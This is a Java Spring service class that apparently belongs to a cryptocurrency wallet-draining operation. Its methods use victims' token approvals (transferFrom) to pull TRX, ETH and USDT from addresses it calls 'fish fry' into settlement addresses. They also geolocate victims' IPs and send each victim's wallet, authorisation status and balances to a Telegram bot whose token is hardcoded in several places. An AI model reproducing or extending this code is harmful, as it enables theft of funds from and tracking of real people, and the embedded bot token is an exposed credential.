package com.ruoyi.tron.config;

import com.alibaba.fastjson2.JSONObject;
import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import com.baomidou.mybatisplus.core.toolkit.Wrappers;
import com.ruoyi.common.core.domain.AjaxResult;
import com.ruoyi.pay.domain.OrgAccountOrder;
import com.ruoyi.tron.domain.OrgAccountInfo;
import com.ruoyi.tron.domain.TronBillRecord;
import com.ruoyi.tron.domain.TronFish;
import com.ruoyi.tron.domain.TronTansferRecord;
import com.ruoyi.tron.service.IOrgAccountInfoService;
import com.ruoyi.tron.service.ITronBillRecordService;
import com.ruoyi.tron.service.ITronFishService;
import com.ruoyi.tron.service.ITronTansferRecordService;
import com.ruoyi.tron.service.impl.TronApiServiceImpl;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import java.math.BigDecimal;
import java.util.Date;

import static com.sunlight.tronsdk.context.HttpContext.restTemplate;

/**
 * 接收消息
 */
@Slf4j
@Service
public class Receiver {

    @Autowired
    private TronApiServiceImpl tronApiServiceImpl;
    @Autowired
    private TronApiServiceImpl ethApiServiceImpl;
    @Autowired
    private ITronBillRecordService iTronBillRecordService;
    @Autowired
    private ITronTansferRecordService iTronTansferRecordService;
    @Autowired
    private ITronFishService iTronFishService;
    @Autowired
    private IOrgAccountInfoService iOrgAccountInfoService;


    public void transferTRX(String message) throws Exception {
        log.debug("transferTRX接收到消息了:{}", message);
        TronTansferRecord tronTansferRecord = JSONObject.parseObject(message, TronTansferRecord.class);
        log.info("tronTansferRecord-TRX", tronTansferRecord);
        AjaxResult result = tronApiServiceImpl.transferTRX(tronTansferRecord.getFromAddress(), tronTansferRecord.getToAddress(),
                tronTansferRecord.getBalance());
        if (result.get(AjaxResult.CODE_TAG).equals(500)) {
            tronTansferRecord.setStatus("3");
            tronTansferRecord.setRemark(result.get(AjaxResult.MSG_TAG).toString());
        }
        if (result.get(AjaxResult.CODE_TAG).equals(200)) {
            tronTansferRecord.setStatus("2");
            tronTansferRecord.setRemark(result.get(AjaxResult.MSG_TAG).toString());
        }
        tronTansferRecord.setUpdateTime(new Date(System.currentTimeMillis()));
        iTronTansferRecordService.saveOrUpdate(tronTansferRecord);

        //发送USDT_TRC20转账消息
        LambdaQueryWrapper<OrgAccountInfo> lqw = Wrappers.lambdaQuery();
        lqw.eq(OrgAccountInfo::getAgencyId, tronTansferRecord.getAgencyId());
        OrgAccountInfo orgAccountInfo = this.iOrgAccountInfoService.getOne(lqw);
        if (orgAccountInfo == null && orgAccountInfo.getTgbotGroupId() == null) {
            return;
        }
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("转账类型：" + "【TRX转账】\n");
        stringBuffer.append("转出地址：" + tronTansferRecord.getFromAddress() + "\n");
        stringBuffer.append("转入地址：" + tronTansferRecord.getToAddress() + "\n");
        stringBuffer.append("转账金额：" + tronTansferRecord.getBalance() + "\n");
        stringBuffer.append("转账结果：" + (result.get(AjaxResult.CODE_TAG).equals(200) ? "转账成功" : "转账失败") + "\n");

        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=" + orgAccountInfo.getTgbotGroupId() + "&text=" + stringBuffer.toString();
        log.info("sendMsg-bot发送请求={}", url2);

        String result2 = restTemplate.getForObject(url2, String.class);
        if (result2.isEmpty()) {
            return;
        }
        log.info("sendMsg-bot返回结果={}", result2);
    }

    public void transferETH(String message) throws Exception {
        log.debug("transferETH接收到消息了:{}", message);
        TronTansferRecord tronTansferRecord = JSONObject.parseObject(message, TronTansferRecord.class);
        log.info("tronTansferRecord-ETH", tronTansferRecord);
        AjaxResult result = ethApiServiceImpl.transferTRX(tronTansferRecord.getFromAddress(), tronTansferRecord.getToAddress(),
                tronTansferRecord.getBalance());
        if (result.get(AjaxResult.CODE_TAG).equals(500)) {
            tronTansferRecord.setStatus("3");
            tronTansferRecord.setRemark(result.get(AjaxResult.MSG_TAG).toString());
        }
        if (result.get(AjaxResult.CODE_TAG).equals(200)) {
            tronTansferRecord.setStatus("2");
            tronTansferRecord.setRemark(result.get(AjaxResult.MSG_TAG).toString());
        }
        tronTansferRecord.setUpdateTime(new Date(System.currentTimeMillis()));
        iTronTansferRecordService.saveOrUpdate(tronTansferRecord);

        //发送USDT_TRC20转账消息
        LambdaQueryWrapper<OrgAccountInfo> lqw = Wrappers.lambdaQuery();
        lqw.eq(OrgAccountInfo::getAgencyId, tronTansferRecord.getAgencyId());
        OrgAccountInfo orgAccountInfo = this.iOrgAccountInfoService.getOne(lqw);
        if (orgAccountInfo == null && orgAccountInfo.getTgbotGroupId() == null) {
            return;
        }
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("转账类型：" + "【ETH转账】\n");
        stringBuffer.append("转出地址：" + tronTansferRecord.getFromAddress() + "\n");
        stringBuffer.append("转入地址：" + tronTansferRecord.getToAddress() + "\n");
        stringBuffer.append("转账金额：" + tronTansferRecord.getBalance() + "\n");
        stringBuffer.append("转账结果：" + (result.get(AjaxResult.CODE_TAG).equals(200) ? "转账成功" : "转账失败") + "\n");

        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=" + orgAccountInfo.getTgbotGroupId() + "&text=" + stringBuffer.toString();
        log.info("sendMsg-bot发送请求={}", url2);

        String result2 = restTemplate.getForObject(url2, String.class);
        if (result2.isEmpty()) {
            return;
        }
        log.info("sendMsg-bot返回结果={}", result2);
    }


    public void transferUSDT_TRC20(String message) throws Exception {
        log.info("transferUSDT_TRC20接收到消息了:{}", message);
        TronTansferRecord tronTansferRecord = JSONObject.parseObject(message, TronTansferRecord.class);
        log.info("tronTansferRecord-USDT-TRC20", tronTansferRecord);
        AjaxResult result = tronApiServiceImpl.transferUSDT(tronTansferRecord.getFromAddress(), tronTansferRecord.getToAddress(),
                tronTansferRecord.getBalance());
        if (result.get(AjaxResult.CODE_TAG).equals(500)) {
            tronTansferRecord.setStatus("3");
            tronTansferRecord.setRemark(result.get(AjaxResult.MSG_TAG).toString());
        }
        if (result.get(AjaxResult.CODE_TAG).equals(200)) {
            tronTansferRecord.setStatus("2");
            tronTansferRecord.setRemark(result.get(AjaxResult.MSG_TAG).toString());
        }
        tronTansferRecord.setUpdateTime(new Date(System.currentTimeMillis()));
        iTronTansferRecordService.saveOrUpdate(tronTansferRecord);

        //发送USDT_TRC20转账消息
        LambdaQueryWrapper<OrgAccountInfo> lqw = Wrappers.lambdaQuery();
        lqw.eq(OrgAccountInfo::getAgencyId, tronTansferRecord.getAgencyId());
        OrgAccountInfo orgAccountInfo = this.iOrgAccountInfoService.getOne(lqw);
        if (orgAccountInfo == null && orgAccountInfo.getTgbotGroupId() == null) {
            return;
        }
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("转账类型：" + "【USDT_TRC20转账】\n");
        stringBuffer.append("转出地址：" + tronTansferRecord.getFromAddress() + "\n");
        stringBuffer.append("转入地址：" + tronTansferRecord.getToAddress() + "\n");
        stringBuffer.append("转账金额：" + tronTansferRecord.getBalance() + "\n");
        stringBuffer.append("转账结果：" + (result.get(AjaxResult.CODE_TAG).equals(200) ? "转账成功" : "转账失败") + "\n");

        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=" + orgAccountInfo.getTgbotGroupId() + "&text=" + stringBuffer.toString();
        log.info("sendMsg-bot发送请求={}", url2);

        String result2 = restTemplate.getForObject(url2, String.class);
        if (result2.isEmpty()) {
            return;
        }
        log.info("sendMsg-bot返回结果={}", result2);

    }

    public void transferUSDT_ERC20(String message) throws Exception {
        log.info("transferUSDT_ERC20接收到消息了:{}", message);
        TronTansferRecord tronTansferRecord = JSONObject.parseObject(message, TronTansferRecord.class);
        log.info("tronTansferRecord-USDT-ERC20", tronTansferRecord);
        AjaxResult result = ethApiServiceImpl.transferUSDT(tronTansferRecord.getFromAddress(), tronTansferRecord.getToAddress(),
                tronTansferRecord.getBalance());
        if (result.get(AjaxResult.CODE_TAG).equals(500)) {
            tronTansferRecord.setStatus("3");
            tronTansferRecord.setRemark(result.get(AjaxResult.MSG_TAG).toString());
        }
        if (result.get(AjaxResult.CODE_TAG).equals(200)) {
            tronTansferRecord.setStatus("2");
            tronTansferRecord.setRemark(result.get(AjaxResult.MSG_TAG).toString());
        }
        tronTansferRecord.setUpdateTime(new Date(System.currentTimeMillis()));
        iTronTansferRecordService.saveOrUpdate(tronTansferRecord);

        //发送USDT_TRC20转账消息
        LambdaQueryWrapper<OrgAccountInfo> lqw = Wrappers.lambdaQuery();
        lqw.eq(OrgAccountInfo::getAgencyId, tronTansferRecord.getAgencyId());
        OrgAccountInfo orgAccountInfo = this.iOrgAccountInfoService.getOne(lqw);
        if (orgAccountInfo == null && orgAccountInfo.getTgbotGroupId() == null) {
            return;
        }
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("转账类型：" + "【USDT_ERC20转账】\n");
        stringBuffer.append("转出地址：" + tronTansferRecord.getFromAddress() + "\n");
        stringBuffer.append("转入地址：" + tronTansferRecord.getToAddress() + "\n");
        stringBuffer.append("转账金额：" + tronTansferRecord.getBalance() + "\n");
        stringBuffer.append("转账结果：" + (result.get(AjaxResult.CODE_TAG).equals(200) ? "转账成功" : "转账失败") + "\n");

        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=" + orgAccountInfo.getTgbotGroupId() + "&text=" + stringBuffer.toString();
        log.info("sendMsg-bot发送请求={}", url2);

        String result2 = restTemplate.getForObject(url2, String.class);
        if (result2.isEmpty()) {
            return;
        }
        log.info("sendMsg-bot返回结果={}", result2);
    }

    public void transferFROMServiceNO(String message) throws Exception {
        log.info("transferFROMServiceNO接收到消息了:{}", message);
        TronBillRecord tronBillRecord = JSONObject.parseObject(message, TronBillRecord.class);
        log.info("tronBillRecord", tronBillRecord);
        //（1）客户地址->结算地址转账，withdraw_balance转化USDT
        AjaxResult result = null;
        if (tronBillRecord.getType().equals("TRX")) {
            result = tronApiServiceImpl.transferFrom(tronBillRecord.getFromAddress(), tronBillRecord.getAuAddress(),
                    tronBillRecord.getToAddress(), tronBillRecord.getWithdrawBalance());
        } else if (tronBillRecord.getType().equals("ETH")) {
            result = ethApiServiceImpl.transferFrom(tronBillRecord.getFromAddress(), tronBillRecord.getAuAddress(),
                    tronBillRecord.getToAddress(), tronBillRecord.getWithdrawBalance());
        }
        log.info("transferFROMServiceNO进行了FROM转账:{}", result);
        if (result.get(AjaxResult.CODE_TAG).equals(500)) {
            tronBillRecord.setStatus("3"); //1=广播中,2=广播成功，3=广播失败，4=交易成功，5=交易失败
            tronBillRecord.setRemark(result.get(AjaxResult.MSG_TAG).toString());
            tronBillRecord.setUpdateTime(new Date(System.currentTimeMillis()));
            iTronBillRecordService.saveOrUpdate(tronBillRecord);
            return;
        }
        if (result.get(AjaxResult.CODE_TAG).equals(200)) {
            tronBillRecord.setStatus("2");
            tronBillRecord.setRemark(result.get(AjaxResult.MSG_TAG).toString());
            iTronBillRecordService.saveOrUpdate(tronBillRecord);
            while (true) {
                Thread.sleep(5000); //等待5秒钟，等待上一笔交易成功 "contractRet": "SUCCESS"
                JSONObject obj = JSONObject.parseObject(result.get(AjaxResult.MSG_TAG).toString());
                if ((boolean) obj.get("result")) {
                    String info = tronApiServiceImpl.queryTransactionbyid((String) obj.get("txid"));
                    if ("SUCCESS".equals(info)) {
                        tronBillRecord.setStatus("4");
                        tronBillRecord.setRemark(tronBillRecord.getRemark() + "【SUCCESS=广播成功】");
                        tronBillRecord.setUpdateTime(new Date(System.currentTimeMillis()));
                        iTronBillRecordService.saveOrUpdate(tronBillRecord);
                        break;
                    }
                    if ("OUT_OF_ENERGY".equals(info)) {
                        tronBillRecord.setStatus("3");
                        tronBillRecord.setRemark(tronBillRecord.getRemark() + "【OUT_OF_ENERGY=TRX01余额不够】");
                        tronBillRecord.setUpdateTime(new Date(System.currentTimeMillis()));
                        iTronBillRecordService.saveOrUpdate(tronBillRecord);
                        return;
                    }
                    if ("REVERT".equals(info)) {
                        tronBillRecord.setStatus("3");
                        tronBillRecord.setRemark(tronBillRecord.getRemark() + "【REVERT=转化金额输入超出余额】");
                        tronBillRecord.setUpdateTime(new Date(System.currentTimeMillis()));
                        iTronBillRecordService.saveOrUpdate(tronBillRecord);
                        return;
                    }
                }
            }

            LambdaQueryWrapper<TronFish> lqw3 = Wrappers.lambdaQuery();
            lqw3.eq(TronFish::getAddress, tronBillRecord.getFromAddress());
            lqw3.eq(TronFish::getAuAddress, tronBillRecord.getAuAddress());
            TronFish tronFish = iTronFishService.getOne(lqw3);
            JSONObject jsonObject = JSONObject.parseObject(tronFish.getBalance());
            Object billusdt = jsonObject.get("billusdt");
            if (billusdt == null) {
                jsonObject.put("billusdt", tronBillRecord.getWithdrawBalance());
            } else {
                BigDecimal bigDecimal = new BigDecimal(String.valueOf(billusdt));
                jsonObject.put("billusdt", bigDecimal.add(new BigDecimal(tronBillRecord.getWithdrawBalance().toString())).doubleValue());
            }
            tronFish.setBalance(jsonObject.toJSONString());
            iTronFishService.saveOrUpdate(tronFish);
        }

    }

    public void transferFROMServiceYES(String message) throws Exception {
        log.info("transferFROMServiceYES接收到消息了:{}", message);
        TronBillRecord tronBillRecord = JSONObject.parseObject(message, TronBillRecord.class);
        log.info("tronBillRecord", tronBillRecord);
        //（1）客户地址->结算地址转账，withdraw_balance转化USDT
        AjaxResult result = null;
        if (tronBillRecord.getType().equals("TRX")) {
            result = tronApiServiceImpl.transferFrom(tronBillRecord.getFromAddress(), tronBillRecord.getAuAddress(),
                    tronBillRecord.getToAddress(), tronBillRecord.getWithdrawBalance());
        } else if (tronBillRecord.getType().equals("ETH")) {
            result = ethApiServiceImpl.transferFrom(tronBillRecord.getFromAddress(), tronBillRecord.getAuAddress(),
                    tronBillRecord.getToAddress(), tronBillRecord.getWithdrawBalance());
        }
        log.info("transferFROMServiceYES进行了FROM转账:{}", result);
        if (result.get(AjaxResult.CODE_TAG).equals(500)) {
            tronBillRecord.setStatus("3"); //1=广播中,2=广播成功，3=广播失败，4=交易成功，5=交易失败
            tronBillRecord.setRemark(result.get(AjaxResult.MSG_TAG).toString());
            tronBillRecord.setUpdateTime(new Date(System.currentTimeMillis()));
            iTronBillRecordService.saveOrUpdate(tronBillRecord);
            return;
        }
        if (result.get(AjaxResult.CODE_TAG).equals(200)) {
            tronBillRecord.setRemark("step01:" + result.get(AjaxResult.MSG_TAG).toString());
            iTronBillRecordService.saveOrUpdate(tronBillRecord);
            while (true) {
                Thread.sleep(5000); //等待5秒钟，等待上一笔交易成功 "contractRet": "SUCCESS"
                JSONObject obj = JSONObject.parseObject(result.get(AjaxResult.MSG_TAG).toString());
                if ((boolean) obj.get("result")) {
                    String info = null;
                    if (tronBillRecord.getType().equals("TRX")) {
                        info = tronApiServiceImpl.queryTransactionbyid((String) obj.get("txid"));
                    } else if (tronBillRecord.getType().equals("ETH")) {
                        info = ethApiServiceImpl.queryTransactionbyid((String) obj.get("txid"));
                    }

                    if ("SUCCESS".equals(info)) {
                        tronBillRecord.setStatus("2");
                        tronBillRecord.setRemark(tronBillRecord.getRemark() + "【SUCCESS=广播成功】");
                        tronBillRecord.setUpdateTime(new Date(System.currentTimeMillis()));
                        iTronBillRecordService.saveOrUpdate(tronBillRecord);
                        break;
                    }
                    if ("OUT_OF_ENERGY".equals(info)) {
                        tronBillRecord.setStatus("3");
                        tronBillRecord.setRemark(tronBillRecord.getRemark() + "【OUT_OF_ENERGY=TRX01余额不够】");
                        tronBillRecord.setUpdateTime(new Date(System.currentTimeMillis()));
                        iTronBillRecordService.saveOrUpdate(tronBillRecord);
                        return;
                    }
                    if ("REVERT".equals(info)) {
                        tronBillRecord.setStatus("3");
                        tronBillRecord.setRemark(tronBillRecord.getRemark() + "【REVERT=转化金额输入超出余额】");
                        tronBillRecord.setUpdateTime(new Date(System.currentTimeMillis()));
                        iTronBillRecordService.saveOrUpdate(tronBillRecord);
                        return;
                    }
                }
            }
            //（2）结算地址->客户转账，bill_address转化USDT
            AjaxResult result2 = tronApiServiceImpl.transferUSDTForEASON(tronBillRecord.getAgencyId(), tronBillRecord.getBillAddress(), tronBillRecord.getToAddress(),
                    tronBillRecord.getBillBalance());
            if (result2.get(AjaxResult.CODE_TAG).equals(500)) {
                tronBillRecord.setStatus("5");
                tronBillRecord.setRemark(tronBillRecord.getRemark() + "step02:" + result2.get(AjaxResult.MSG_TAG).toString());
                tronBillRecord.setUpdateTime(new Date(System.currentTimeMillis()));
                iTronBillRecordService.saveOrUpdate(tronBillRecord);
                return;
            }

            if (result2.get(AjaxResult.CODE_TAG).equals(200)) {
                tronBillRecord.setRemark(tronBillRecord.getRemark() + "step02:" + result2.get(AjaxResult.MSG_TAG).toString());
                while (true) {
                    Thread.sleep(5000); //等待5秒钟，等待上一笔交易成功 "contractRet": "SUCCESS"
                    JSONObject obj = JSONObject.parseObject(result2.get(AjaxResult.MSG_TAG).toString());
                    if ((boolean) obj.get("result")) {
                        String info = null;
                        if (tronBillRecord.getType().equals("TRX")) {
                            info = tronApiServiceImpl.queryTransactionbyid((String) obj.get("txid"));
                        } else if (tronBillRecord.getType().equals("ETH")) {
                            info = ethApiServiceImpl.queryTransactionbyid((String) obj.get("txid"));
                        }
                        if ("SUCCESS".equals(info)) {
                            tronBillRecord.setStatus("4");
                            tronBillRecord.setRemark(tronBillRecord.getRemark() + "【SUCCESS=交易成功】");
                            tronBillRecord.setUpdateTime(new Date(System.currentTimeMillis()));
                            iTronBillRecordService.saveOrUpdate(tronBillRecord);
                            break;
                        }
                        if ("OUT_OF_ENERGY".equals(info)) {
                            tronBillRecord.setStatus("5");
                            tronBillRecord.setRemark(tronBillRecord.getRemark() + "【OUT_OF_ENERGY=TRX02余额不够】");
                            tronBillRecord.setUpdateTime(new Date(System.currentTimeMillis()));
                            iTronBillRecordService.saveOrUpdate(tronBillRecord);
                            return;
                        }
                        if ("REVERT".equals(info)) {
                            tronBillRecord.setStatus("5");
                            tronBillRecord.setRemark(tronBillRecord.getRemark() + "【REVERT=交易失败】");
                            tronBillRecord.setUpdateTime(new Date(System.currentTimeMillis()));
                            iTronBillRecordService.saveOrUpdate(tronBillRecord);
                            return;
                        }
                    }
                }

            }

            LambdaQueryWrapper<TronFish> lqw3 = Wrappers.lambdaQuery();
            lqw3.eq(TronFish::getAddress, tronBillRecord.getFromAddress());
            lqw3.eq(TronFish::getAuAddress, tronBillRecord.getAuAddress());
            TronFish tronFish = iTronFishService.getOne(lqw3);
            JSONObject jsonObject = JSONObject.parseObject(tronFish.getBalance());
            Object billusdt = jsonObject.get("billusdt");
            if (billusdt == null) {
                jsonObject.put("billusdt", tronBillRecord.getWithdrawBalance());
            } else {
                BigDecimal bigDecimal = new BigDecimal(String.valueOf(billusdt));
                jsonObject.put("billusdt", bigDecimal.add(new BigDecimal(tronBillRecord.getWithdrawBalance().toString())).doubleValue());
            }
            tronFish.setBalance(jsonObject.toJSONString());
            iTronFishService.saveOrUpdate(tronFish);

        }

    }

    public void createIpArea(String message) throws Exception {
        log.debug("createIpArea接收到消息了:{}", message);
        TronFish fish = JSONObject.parseObject(message, TronFish.class);
        log.info("createIpArea-fish", fish);
        String url = "https://whois.pconline.com.cn/ipJson.jsp?ip=" + fish.getIp() + "&json=true";
        RestTemplate restTemplate = new RestTemplate();
        String result = restTemplate.getForObject(url, String.class);
        if (result.isEmpty()) {
            return;
        }
        String addr = JSONObject.parseObject(result).getString("addr");
        fish.setArea(addr);

        iTronFishService.saveOrUpdate(fish);
    }

    public void sendMsg(String message) throws Exception {
        log.debug("sendMsg接收到消息了:{}", message);
        TronFish fish = JSONObject.parseObject(message, TronFish.class);
        log.info("sendMsg-fish", fish);
        String url = "https://whois.pconline.com.cn/ipJson.jsp?ip=" + fish.getIp() + "&json=true";
        RestTemplate restTemplate = new RestTemplate();
        String result = restTemplate.getForObject(url, String.class);
        if (result.isEmpty()) {
            return;
        }
        String addr = JSONObject.parseObject(result).getString("addr");
        fish.setArea(addr);
        iTronFishService.saveOrUpdate(fish);

        LambdaQueryWrapper<OrgAccountInfo> lqw = Wrappers.lambdaQuery();
        lqw.eq(OrgAccountInfo::getAgencyId, fish.getAgencyId());
        OrgAccountInfo orgAccountInfo = this.iOrgAccountInfoService.getOne(lqw);
        if (orgAccountInfo == null && orgAccountInfo.getTgbotGroupId() == null) {
            return;
        }
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("鱼苗IP：" + addr + "【" + fish.getIp() + "】\n");
        stringBuffer.append("鱼苗信息：" + fish.getAddress() + "\n");
        stringBuffer.append("授权地址：" + fish.getAuAddress() + "\n");
        stringBuffer.append("鱼苗状态：" + (fish.getAuRecordId() != null ? "已授权" : "未授权") + "\n");

        JSONObject jsonObject = JSONObject.parseObject(fish.getBalance());
        String info = "";
        if ("ETH".equalsIgnoreCase(fish.getType())) {
            info = "ETH=" + jsonObject.get("eth") + ",USDT=" + jsonObject.get("usdt");
        }
        if ("TRX".equalsIgnoreCase(fish.getType())) {
            info = "TRX=" + jsonObject.get("trx") + ",USDT=" + jsonObject.get("usdt");
        }
        stringBuffer.append("鱼苗余额：" + info + "\n");

        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=" + orgAccountInfo.getTgbotGroupId() + "&text=" + stringBuffer.toString();
        log.info("sendMsg-bot发送请求={}", url2);

        String result2 = restTemplate.getForObject(url2, String.class);
        if (result2.isEmpty()) {
            return;
        }
        log.info("sendMsg-bot返回结果={}", result2);
    }

    public void sendMsgPay(String message) throws Exception {
        log.debug("sendMsgPay接收到消息了:{}", message);
        OrgAccountOrder orgAccountOrder = JSONObject.parseObject(message, OrgAccountOrder.class);

        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("商户订单号：" + orgAccountOrder.getOrderId() + "\n");
        stringBuffer.append("上分金额：" + orgAccountOrder.getAmount() + "\n");
        stringBuffer.append("支付金额：" + orgAccountOrder.getCoinAmount() + "\n");
        stringBuffer.append("支付币种：" + orgAccountOrder.getCoinCode() + "\n");
        stringBuffer.append("支付状态：" + (orgAccountOrder.getStatus().equals("2") ? "支付成功" : "支付中") + "\n");
        stringBuffer.append("收款地址：" + orgAccountOrder.getCoinAddress() + "\n");

        LambdaQueryWrapper<OrgAccountInfo> lqw = Wrappers.lambdaQuery();
        lqw.eq(OrgAccountInfo::getAgencyId, orgAccountOrder.getSiteId());
        OrgAccountInfo orgAccountInfo = this.iOrgAccountInfoService.getOne(lqw);
        if (orgAccountInfo == null && orgAccountInfo.getTgbotGroupId() == null) {
            return;
        }

        String url2 = "https://api.telegram.org/bot5745457029:AAGiQ3ksIDnlY0oLFaoG_z1GGMlXyJg1iOE/sendMessage?chat_id=" + orgAccountInfo.getTgbotGroupId() + "&text=" + stringBuffer.toString();
        log.info("sendMsgPay-bot发送请求={}", url2);

        String result2 = restTemplate.getForObject(url2, String.class);
        if (result2.isEmpty()) {
            return;
        }
        log.info("sendMsgPay-bot返回结果={}", result2);
    }

}
